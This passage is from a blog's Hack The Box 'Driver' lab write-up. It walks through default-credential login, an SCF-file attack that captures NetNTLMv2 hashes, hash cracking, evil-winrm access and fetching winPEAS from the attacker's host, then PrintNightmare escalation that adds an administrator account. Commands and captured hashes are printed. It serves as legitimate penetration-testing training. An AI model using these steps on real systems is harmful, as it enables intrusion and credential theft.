</span></span><span style=display:flex><span>CVE-2020-0796 Remote Code Execution POC
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> ZecOps, Inc.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Target is not vulnerable
</span></span></code></pre></div><p>Some other enumeration attepmts I learnt from <a href=https://book.hacktricks.xyz/pentesting/pentesting-smb>HackTricks</a> also felt short as they returned no novel information.</p><h2 id=iii-successful-enumeration-attempts>III. Successful enumeration attempts<a hidden class=anchor aria-hidden=true href=#iii-successful-enumeration-attempts>#</a></h2><p>Afterwards, somehow I followed my nose and randomly typed <em><code>admin</code> - <code>password</code></em> into the HTTP simple login form, as well as <em><code>admin</code> - <code>pass</code></em>. In the third attempt with <em><code>admin</code> - <code>admin</code></em>, it happily got me through:</p><p><img loading=lazy src=/img/driver/port80_admin_admin.png#center alt></p><p>Next, I maniacally clicked on whatever seems clickable. In spite of that, there was nothing but this firmware update page:</p><p><img loading=lazy src=/img/driver/only-clickable-firmware-update-page.png#center alt></p><p>Through Burp Suite, the page appeared to be a fundamental file uploading page, directly via HTTP POST request, with no validation whatsoever. <a href=https://www.wappalyzer.com/>Wappalyzer</a> suggested a PHP backend, therefore, I tried a <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>PHP reverse shell</a> along with some other web payloads and Windows payloads. Nonetheless, nothing worked, which compelled us to seek out for a better attack vector.</p><p>But hold on, files, with SMB&mldr; At that moment, my mind finally pieced the clues together and the answer suddenly dawned on me: How about a <a href=https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/><strong>SCF file attack</strong></a>?</p><p>This straght-to-the-point <a href=https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/>guide from Pentestlab</a> covered all knowledge needed to start diving into exploiting the vulnerability. Thus, just strictly follow the guide and we got some sweet hashes like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 auxiliary<span style=color:#f92672>(</span>server/capture/smb<span style=color:#f92672>)</span> &gt; exploit
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Auxiliary module running as background job 1.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Server is running. Listening on 10.10.14.21:445
</span></span><span style=display:flex><span>msf6 auxiliary<span style=color:#f92672>(</span>server/capture/smb<span style=color:#f92672>)</span> &gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Received SMB connection on Auth Capture Server!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Client     : 10.10.11.106
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Username   : DRIVER<span style=color:#ae81ff>\t</span>ony
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Hash       : tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Received SMB connection on Auth Capture Server!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Client     : 10.10.11.106
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Username   : DRIVER<span style=color:#ae81ff>\t</span>ony
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SMB<span style=color:#f92672>]</span> NTLMv2-SSP Hash       : tony::DRIVER:e6fbeb49363872ac:cc3944c26e2cb37a604ed94691a61e3a:01010000000000008014b0dbda1bd80185625afe652e0d74000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008014b0dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># and several more that looks pretty much alike</span>
</span></span></code></pre></div><p>Because I didn&rsquo;t know which one was the &ldquo;legitimate&rdquo; hash, using some small scripting tricks I dumped them all into separate files, so as to check them using <em><code>hashid</code></em>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/Driver<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ hashid userhash
</span></span><span style=display:flex><span>--File <span style=color:#e6db74>&#39;userhash&#39;</span>--
</span></span><span style=display:flex><span>Analyzing <span style=color:#e6db74>&#39;tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> NetNTLMv2 
</span></span><span style=display:flex><span>Analyzing <span style=color:#e6db74>&#39;400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a00100&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Unknown hash
</span></span><span style=display:flex><span>Analyzing <span style=color:#e6db74>&#39;0000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Unknown hash
</span></span><span style=display:flex><span>--End of file <span style=color:#e6db74>&#39;userhash&#39;</span>--                                                                                                                      
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/Driver<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ hashid userhash2
</span></span><span style=display:flex><span>--File <span style=color:#e6db74>&#39;userhash2&#39;</span>--
</span></span><span style=display:flex><span>Analyzing &lt;REDACTED&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> NetNTLMv2 
</span></span><span style=display:flex><span>--End of file <span style=color:#e6db74>&#39;userhash2&#39;</span>--
</span></span></code></pre></div><h2 id=iv-foothold>IV. Foothold<a hidden class=anchor aria-hidden=true href=#iv-foothold>#</a></h2><p>You will miss all the fun if I let on all the real credentials. For that reason, critical credentials will be redacted from this point onwards.</p><p>A question is, where to use all these hashes? An obvious answer is via <a href=https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm>the WinRM 5985 port</a>.</p><p>Next question would be, &ldquo;how&rdquo;? Well, let&rsquo;s go for a must-have tool - <a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a>. Installing instructions are all clearly put accross in <a href=https://github.com/Hackplayers/evil-winrm/blob/master/README.md>its README file</a>, so I&rsquo;ll not go into details here.</p><p>Checking for options <strong><code>evil-winrm</code></strong> provides, there&rsquo;s a <em><strong><code>-H</code></strong></em> switch to log in with NTML hash. However&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ evil-winrm -i driver.htb -u tony -H <span style=color:#e6db74>&#34;&lt;REDACTED_LEGITIMATE_HASH&gt;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Evil-WinRM shell v3.3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Error: Invalid hash format
</span></span></code></pre></div><p>It didn&rsquo;t work, and god knows why. Consequently, it was unavoidable to face the hassle of cracking this hash on my potato machine. Thankfully the hash didn&rsquo;t take donkey&rsquo;s years to crack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ john userhash2
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>netntlmv2, NTLMv2 C/R <span style=color:#f92672>[</span>MD4 HMAC-MD5 32/64<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>2</span> OpenMP threads
</span></span><span style=display:flex><span>Proceeding with single, rules:Single
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>Almost <span style=color:#66d9ef>done</span>: Processing the remaining buffered candidate passwords, <span style=color:#66d9ef>if</span> any.
</span></span><span style=display:flex><span>Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span style=display:flex><span>Proceeding with incremental:ASCII
</span></span><span style=display:flex><span>&lt;REDACTED_TONY_PASSWORD&gt;          <span style=color:#f92672>(</span>tony<span style=color:#f92672>)</span>     
</span></span><span style=display:flex><span>1g 0:00:02:44 DONE 3/3 <span style=color:#f92672>(</span>2022-02-07 01:43<span style=color:#f92672>)</span> 0.006064g/s 957216p/s 957216c/s 957216C/s labzter..lilton3
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed. 
</span></span></code></pre></div><p>With the password now in own hand, it&rsquo;s a piece of cake getting a shell callback.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ evil-winrm -i driver.htb -u tony -p &lt;REDACTED_TONY_PASSWORD&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Evil-WinRM shell v3.3
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style=color:#f92672>()</span> <span style=color:#66d9ef>function</span> is unimplemented on this machine
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\t</span>ony<span style=color:#ae81ff>\D</span>ocuments&gt; 
</span></span></code></pre></div><p>And the rock stable shell of <em><code>evil-winrm</code></em> easily led me to the user flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>*Evil-WinRM* PS C:\Users\tony\Desktop&gt; Get-ChildItem
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\tony\Desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>-ar---         2/7/2022   5<span style=color:#960050;background-color:#1e0010>:</span>21 AM             34 user.txt
</span></span></code></pre></div><h2 id=v-privilege-escalation>V. Privilege Escalation<a hidden class=anchor aria-hidden=true href=#v-privilege-escalation>#</a></h2><p>First and foremost, <a href=https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS>WinPEAS</a> all the way through.</p><p>On our attacker machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wget https://github.com/carlospolop/PEASS-ng/releases/download/20220206/winPEASany.exe -O finding.exe
</span></span></code></pre></div><p>On the remote shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Invoke-WebRequest -URI http<span style=color:#960050;background-color:#1e0010>:</span>//10.10.14.21/finding.exe -UseBasicParsing -OutFile finding.exe
</span></span></code></pre></div><p>Carefully examining <strong>WinPEAS</strong> result, we cannot see many exeptional things showed up, but the most notable one is probably a runing service named <a href=https://www.howtogeek.com/323332/what-is-spooler-subsystem-app-spoolsv.exe-and-why-is-it-running-on-my-pc/>spoolsv.exe</a>.</p><p>In short, <em><strong>spoolsv</strong></em> signifies the existence of a printer and printing <em><strong>drivers</strong></em>, which reminds us about the unforgettable <a href=https://en.wikipedia.org/wiki/PrintNightmare>PrintNightmare</a> - a vulnerability chain comprises of <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527>CVE-2021-34527</a>, <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481>CVE-2021-34481</a> (for RCE) and <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675>CVE-2021-1675</a> (for local privilege escalation). Unquestionably, we will use the last one.</p><p>A quick Github search led me to <a href=https://github.com/cube0x0/CVE-2021-1675>a C# POC</a> that seems to work.</p><div class=github-card data-github=cube0x0/CVE-2021-1675 data-width=400 data-height data-theme=medium></div><script src=//cdn.jsdelivr.net/github-cards/latest/widget.js></script><p>However, its setup called for an abundance of time, so I gave it a miss and tried out <a href=https://github.com/calebstewart/CVE-2021-1675>this simple script instead</a>.</p><div class=github-card data-github=calebstewart/CVE-2021-1675 data-width=400 data-height=317 data-theme=medium></div><script src=//cdn.jsdelivr.net/github-cards/latest/widget.js></script><p>Without further ado, I straghtforwardly followed the <a href=https://github.com/calebstewart/CVE-2021-1675/blob/main/README.md>README</a> and it smoothly did the trick.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>*Evil-WinRM* PS C:\Users\tony\Downloads&gt; Invoke-Nightmare
</span></span><span style=display:flex><span>[+] using <span style=color:#66d9ef>default</span> new user<span style=color:#960050;background-color:#1e0010>:</span> adm1n
</span></span><span style=display:flex><span>[+] using <span style=color:#66d9ef>default</span> new password<span style=color:#960050;background-color:#1e0010>:</span> P@ssw0rd
</span></span><span style=display:flex><span>[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
</span></span><span style=display:flex><span>[+] using pDriverPath = <span style=color:#e6db74>&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&#34;</span>
</span></span><span style=display:flex><span>[+] added user  as local administrator
</span></span><span style=display:flex><span>[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
</span></span></code></pre></div><p>At that point, what&rsquo;s left was to log in using <em><code>adm1n</code></em> account (which has Administrator privilege) and snatch the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm -i driver.htb -u adm1n -p P@ssw0rd
</span></span></code></pre></div><p>Root flag can be found effortlessly at Administrator&rsquo;s Desktop folder.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator&gt; cd C:\Users\Administrator\Desktop
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\Administrator\Desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name
</span></span><span style=display:flex><span>----                -------------         ------ ----
</span></span><span style=display:flex><span>-ar---         2/8/2022   5<span style=color:#960050;background-color:#1e0010>:</span>04 AM             34 root.txt
</span></span></code></pre></div><p>And that&rsquo;s all. Hope you&rsquo;ve enjoyed this vastly informative box.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li><li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li></ul><nav class=paginav><a class=prev href=https://git-akihakune.github.io/blog/gallery/><span class=title>« Prev Page</span><br><span>Try Hack Me - Gallery</span></a>
<a class=next href=https://git-akihakune.github.io/blog/horizontall/><span class=title>Next Page »</span><br><span>Hack The Box - Horizontall</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20-%20Driver&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f&hashtags=ctf%2ctech"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f&title=Hack%20The%20Box%20-%20Driver&summary=Hack%20The%20Box%20-%20Driver&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f&title=Hack%20The%20Box%20-%20Driver"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20-%20Driver%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box - Driver on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20-%20Driver&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fdriver%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
- Aki Hakune</footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})})</script><script type=module src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js></script>
<script nomodule src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js></script>
<script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>